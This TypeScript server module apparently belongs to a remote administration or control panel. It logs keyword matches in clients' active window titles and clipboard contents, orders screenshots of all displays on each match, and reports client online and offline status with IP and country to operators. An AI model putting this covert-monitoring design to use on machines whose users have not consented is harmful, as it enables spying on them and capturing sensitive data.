import type { ServerWebSocket } from "bun";
import { encode as msgpackEncode } from "@msgpack/msgpack";
import { v4 as uuidv4 } from "uuid";
import * as clientManager from "../clientManager";
import { logger } from "../logger";
import { metrics } from "../metrics";
import { encodeMessage } from "../protocol";
import * as sessionManager from "../sessions/sessionManager";
import type { SocketData } from "../sessions/types";
import { deliverWebPushClientEvent, deliverClientEventToExternalChannels, type UserDeliveryTarget } from "./notification-delivery";

type NotificationRecord = {
  id: string;
  clientId: string;
  host?: string;
  user?: string;
  os?: string;
  title: string;
  process?: string;
  processPath?: string;
  pid?: number;
  keyword?: string;
  category: "active_window" | "clipboard";
  ts: number;
  screenshotId?: string;
};

type NotificationRateState = {
  lastSent: number;
  windowStart: number;
  suppressed: number;
  lastWarned: number;
};

type PendingNotificationScreenshot = {
  notificationId: string;
  clientId: string;
  ts: number;
  timeout: NodeJS.Timeout;
};

type NotificationConfigShape = {
  minIntervalMs?: number;
  spamWindowMs?: number;
  spamWarnThreshold?: number;
  historyLimit?: number;
};

type CreateDeps = {
  notificationHistory: NotificationRecord[];
  notificationRate: Map<string, NotificationRateState>;
  pendingNotificationScreenshots: Map<string, PendingNotificationScreenshot>;
  pluginLoadedByClient: Map<string, Set<string>>;
  pluginLoadingByClient: Map<string, Set<string>>;
  pendingPluginEvents: Map<string, Array<{ event: string; payload: any }>>;
  pluginState: { enabled: Record<string, boolean>; lastError: Record<string, string> };
  getNotificationConfig: () => NotificationConfigShape;
  canUserAccessClient: (userId: number, userRole: string, clientId: string) => boolean;
  getUserRole: (userId: number) => string | undefined;
  storeNotificationScreenshot: (
    pending: PendingNotificationScreenshot,
    bytes: Uint8Array,
    format: string,
    width?: number,
    height?: number,
  ) => void;
  deliverNotificationWithScreenshot: (record: NotificationRecord) => Promise<void>;
  getDeliveryTargetsForClientEvent: (
    event: string,
    clientId: string,
  ) => UserDeliveryTarget[];
  savePluginState: () => Promise<void>;
};

function safeSendViewer(ws: ServerWebSocket<SocketData>, payload: unknown) {
  try {
    ws.send(msgpackEncode(payload));
  } catch (err) {
    logger.error("[viewer] send failed", err);
  }
}

export function createNotificationPluginHandlers(deps: CreateDeps) {
  const pluginUIEventBuffer = new Map<string, Array<{ event: string; payload: any; ts: number }>>();
  const PLUGIN_UI_EVENT_BUFFER_MAX = 200;
  const PLUGIN_UI_EVENT_TTL_MS = 60_000;

  function bufferPluginUIEvent(clientId: string, pluginId: string, event: string, payload: any) {
    const key = `${clientId}:${pluginId}`;
    let list = pluginUIEventBuffer.get(key);
    if (!list) {
      list = [];
      pluginUIEventBuffer.set(key, list);
    }
    list.push({ event, payload, ts: Date.now() });
    if (list.length > PLUGIN_UI_EVENT_BUFFER_MAX) {
      list.splice(0, list.length - PLUGIN_UI_EVENT_BUFFER_MAX);
    }
  }

  function drainPluginUIEvents(clientId: string, pluginId: string): Array<{ event: string; payload: any }> {
    const key = `${clientId}:${pluginId}`;
    const list = pluginUIEventBuffer.get(key);
    if (!list || list.length === 0) return [];
    const now = Date.now();
    const fresh = list.filter((e) => now - e.ts < PLUGIN_UI_EVENT_TTL_MS);
    pluginUIEventBuffer.delete(key);
    return fresh.map(({ event, payload }) => ({ event, payload }));
  }

  function requestNotificationScreenshot(info: any, record: NotificationRecord) {
    if (!info || !info.ws) return;
    const commandId = `notify-shot-${uuidv4()}`;
    const timeout = setTimeout(() => {
      deps.pendingNotificationScreenshots.delete(commandId);
    }, 15_000);

    deps.pendingNotificationScreenshots.set(commandId, {
      notificationId: record.id,
      clientId: record.clientId,
      ts: record.ts,
      timeout,
    });

    try {
      info.ws.send(
        encodeMessage({
          type: "command",
          commandType: "screenshot",
          id: commandId,
          payload: { mode: "notification", allDisplays: true },
        } as any),
      );
      metrics.recordCommand("screenshot");
    } catch (err) {
      clearTimeout(timeout);
      deps.pendingNotificationScreenshots.delete(commandId);
      logger.warn("[notify] failed to request screenshot", err);
    }
  }

  function shouldAcceptNotification(key: string, ts: number): boolean {
    const notificationConfig = deps.getNotificationConfig();
    const minInterval = Math.max(1000, notificationConfig.minIntervalMs || 8000);
    const spamWindow = Math.max(5000, notificationConfig.spamWindowMs || 60000);
    const warnThreshold = Math.max(1, notificationConfig.spamWarnThreshold || 5);
    const state = deps.notificationRate.get(key) || {
      lastSent: 0,
      windowStart: ts,
      suppressed: 0,
      lastWarned: 0,
    };

    if (ts - state.windowStart > spamWindow) {
      state.windowStart = ts;
      state.suppressed = 0;
      state.lastWarned = 0;
    }

    if (ts - state.lastSent < minInterval) {
      state.suppressed += 1;
      if (
        state.suppressed >= warnThreshold &&
        ts - state.lastWarned > Math.floor(spamWindow / 2)
      ) {
        logger.warn(`[notify] suppressed ${state.suppressed} notifications in ${spamWindow}ms for ${key}`);
        state.lastWarned = ts;
      }
      deps.notificationRate.set(key, state);
      return false;
    }

    state.lastSent = ts;
    state.suppressed = 0;
    deps.notificationRate.set(key, state);
    return true;
  }

  function pruneNotificationRate() {
    const notificationConfig = deps.getNotificationConfig();
    const spamWindow = Math.max(5000, notificationConfig.spamWindowMs || 60000);
    const maxAge = spamWindow * 2;
    const now = Date.now();
    for (const [key, state] of deps.notificationRate) {
      if (now - state.lastSent > maxAge && now - state.windowStart > maxAge) {
        deps.notificationRate.delete(key);
      }
    }
  }

  setInterval(pruneNotificationRate, 60_000);

  function flushPluginEvents(clientId: string, pluginId: string) {
    const key = `${clientId}:${pluginId}`;
    const list = deps.pendingPluginEvents.get(key);
    if (!list || list.length === 0) return;
    const target = clientManager.getClient(clientId);
    if (!target) return;
    for (const item of list) {
      target.ws.send(
        encodeMessage({
          type: "plugin_event",
          pluginId,
          event: item.event,
          payload: item.payload,
        } as any),
      );
    }
    deps.pendingPluginEvents.delete(key);
  }

  function markPluginLoaded(clientId: string, pluginId: string) {
    if (!clientId || !pluginId) return;
    let set = deps.pluginLoadedByClient.get(clientId);
    if (!set) {
      set = new Set();
      deps.pluginLoadedByClient.set(clientId, set);
    }
    set.add(pluginId);
    deps.pluginLoadingByClient.get(clientId)?.delete(pluginId);
  }

  return {
    handleNotificationViewerOpen(ws: ServerWebSocket<SocketData>) {
      const sessionId = uuidv4();
      const userId = ws.data.userId;
      const userRole = ws.data.userRole || "";
      sessionManager.addNotificationSession({
        id: sessionId,
        viewer: ws,
        createdAt: Date.now(),
        userId,
        userRole,
      });
      ws.data.sessionId = sessionId;
      logger.info(`[notify] viewer connected session=${sessionId} userId=${userId ?? "?"} role=${userRole}`);

      const visibleHistory =
        userRole === "admin"
          ? deps.notificationHistory
          : deps.notificationHistory.filter(
              (item) =>
                userId !== undefined &&
                deps.canUserAccessClient(userId, userRole, item.clientId),
            );

      safeSendViewer(ws, { type: "ready", sessionId, history: visibleHistory });
    },

    handleNotification(clientId: string, payload: any) {
      const ts = Number(payload.ts) || Date.now();
      const title = typeof payload.title === "string" ? payload.title : "";
      if (!title) return;
      const keyword = typeof payload.keyword === "string" ? payload.keyword : "";
      const rateKey = `${clientId}:${keyword || title}`;
      if (!shouldAcceptNotification(rateKey, ts)) {
        return;
      }
      const info = clientManager.getClient(clientId);
      const category: "active_window" | "clipboard" =
        payload.category === "clipboard" ? "clipboard" : "active_window";
      logger.info(`[notify] client=${clientId} keyword=${keyword || "-"} category=${category} title=${title}`);
      const record: NotificationRecord = {
        id: uuidv4(),
        clientId,
        host: info?.host,
        user: info?.user,
        os: info?.os,
        title,
        process: typeof payload.process === "string" ? payload.process : "",
        processPath: typeof payload.processPath === "string" ? payload.processPath : "",
        pid: Number(payload.pid) || undefined,
        keyword,
        category,
        ts,
      };

      deps.notificationHistory.unshift(record);
      const notificationConfig = deps.getNotificationConfig();
      const limit = Math.max(50, notificationConfig.historyLimit || 200);
      if (deps.notificationHistory.length > limit) {
        deps.notificationHistory.splice(limit);
      }

      requestNotificationScreenshot(info, record);

      for (const session of sessionManager.getAllNotificationSessions().values()) {
        const sRole = session.userRole ?? session.viewer.data.userRole ?? "";
        const sUserId = session.userId ?? session.viewer.data.userId;
        if (sRole !== "admin") {
          if (sUserId === undefined || !deps.canUserAccessClient(sUserId, sRole, clientId)) {
            continue;
          }
        }
        safeSendViewer(session.viewer, { type: "notification", item: record });
      }

      void deps.deliverNotificationWithScreenshot(record);
    },

    handleNotificationScreenshotFailure(commandId?: string, ok?: boolean, message?: string) {
      if (!commandId) return;
      if (ok === true) return;
      const pending = deps.pendingNotificationScreenshots.get(commandId);
      if (!pending) return;
      clearTimeout(pending.timeout);
      deps.pendingNotificationScreenshots.delete(commandId);
      if (message) {
        logger.warn(`[notify] screenshot failed commandId=${commandId} message=${message}`);
      }
    },

    handleNotificationScreenshotResult(clientId: string, payload: any) {
      const commandId = typeof payload.commandId === "string" ? payload.commandId : "";
      if (!commandId) return;
      const pending = deps.pendingNotificationScreenshots.get(commandId);
      if (!pending) return;
      clearTimeout(pending.timeout);
      deps.pendingNotificationScreenshots.delete(commandId);

      if (payload.error) {
        logger.warn(`[notify] screenshot error commandId=${commandId}`, payload.error);
        return;
      }

      let bytes: Uint8Array | null = null;
      if (payload.data instanceof Uint8Array) {
        bytes = payload.data;
      } else if (payload.data instanceof ArrayBuffer) {
        bytes = new Uint8Array(payload.data);
      } else if (ArrayBuffer.isView(payload.data)) {
        bytes = new Uint8Array(payload.data.buffer);
      }

      if (!bytes || bytes.length === 0) {
        logger.warn(`[notify] screenshot missing data commandId=${commandId}`);
        return;
      }

      const format = typeof payload.format === "string" ? payload.format : "jpeg";
      const width = Number(payload.width) || undefined;
      const height = Number(payload.height) || undefined;
      deps.storeNotificationScreenshot(pending, bytes, format, width, height);
    },

    clearPendingNotificationScreenshots(clientId: string) {
      for (const [commandId, pending] of deps.pendingNotificationScreenshots.entries()) {
        if (pending.clientId !== clientId) continue;
        clearTimeout(pending.timeout);
        deps.pendingNotificationScreenshots.delete(commandId);
      }
    },

    broadcastClientLifecycleEvent(
      event: "client_online" | "client_offline" | "client_purgatory",
      info: { id: string; host?: string; user?: string; os?: string; ip?: string; country?: string },
    ) {
      const item = { type: "client_event", event, clientId: info.id, host: info.host, user: info.user, os: info.os, ip: info.ip, country: info.country, ts: Date.now() };
      for (const session of sessionManager.getAllNotificationSessions().values()) {
        const sRole = session.userRole ?? session.viewer.data.userRole ?? "";
        const sUserId = session.userId ?? session.viewer.data.userId;
        if (event === "client_purgatory") {
          if (sRole !== "admin" && sRole !== "operator") continue;
        } else {
          if (sRole !== "admin") {
            if (sUserId === undefined || !deps.canUserAccessClient(sUserId, sRole, info.id)) {
              continue;
            }
          }
        }
        safeSendViewer(session.viewer, item);
      }

      const externalTargets = deps.getDeliveryTargetsForClientEvent(event, info.id);
      const pushEnabledByUser = new Map(externalTargets.map((t) => [t.userId, t.clientEventPush]));

      void deliverWebPushClientEvent(event, info, deps.canUserAccessClient, deps.getUserRole, (userId) => {
        const enabled = pushEnabledByUser.get(userId);
        return enabled !== undefined ? enabled : true;
      });

      void deliverClientEventToExternalChannels(event, info, externalTargets);
    },

    markPluginLoaded,

    clearClientPluginState(clientId: string) {
      deps.pluginLoadedByClient.delete(clientId);
      deps.pluginLoadingByClient.delete(clientId);
    },

    isPluginLoaded(clientId: string, pluginId: string): boolean {
      return deps.pluginLoadedByClient.get(clientId)?.has(pluginId) ?? false;
    },

    isPluginLoading(clientId: string, pluginId: string): boolean {
      return deps.pluginLoadingByClient.get(clientId)?.has(pluginId) ?? false;
    },

    markPluginLoading(clientId: string, pluginId: string) {
      if (!clientId || !pluginId) return;
      let set = deps.pluginLoadingByClient.get(clientId);
      if (!set) {
        set = new Set();
        deps.pluginLoadingByClient.set(clientId, set);
      }
      set.add(pluginId);
    },

    enqueuePluginEvent(clientId: string, pluginId: string, event: string, payload: any) {
      const key = `${clientId}:${pluginId}`;
      const list = deps.pendingPluginEvents.get(key) || [];
      list.push({ event, payload });
      deps.pendingPluginEvents.set(key, list);
    },

    handlePluginEvent(clientId: string, payload: any) {
      const pluginId = (payload as any).pluginId || "";
      const event = (payload as any).event || "";
      const error = (payload as any).error || "";
      const eventPayload = (payload as any).payload;
      logger.debug(`[plugin] client=${clientId} plugin=${pluginId} event=${event} error=${error}`);
      if (event === "loaded") {
        markPluginLoaded(clientId, pluginId);
        flushPluginEvents(clientId, pluginId);
        if (pluginId) {
          deps.pluginState.lastError[pluginId] = "";
          void deps.savePluginState();
        }
      }
      if (event === "unloaded") {
        deps.pluginLoadedByClient.get(clientId)?.delete(pluginId);
      }
      if (event === "error" || error) {
        if (pluginId) {
          deps.pluginState.lastError[pluginId] = error || String((payload as any).message || "plugin error");
          void deps.savePluginState();
        }
      }
      // Buffer all events for UI polling
      if (pluginId && event) {
        bufferPluginUIEvent(clientId, pluginId, event, eventPayload ?? (error ? { error } : null));
      }
    },

    drainPluginUIEvents,
  };
}
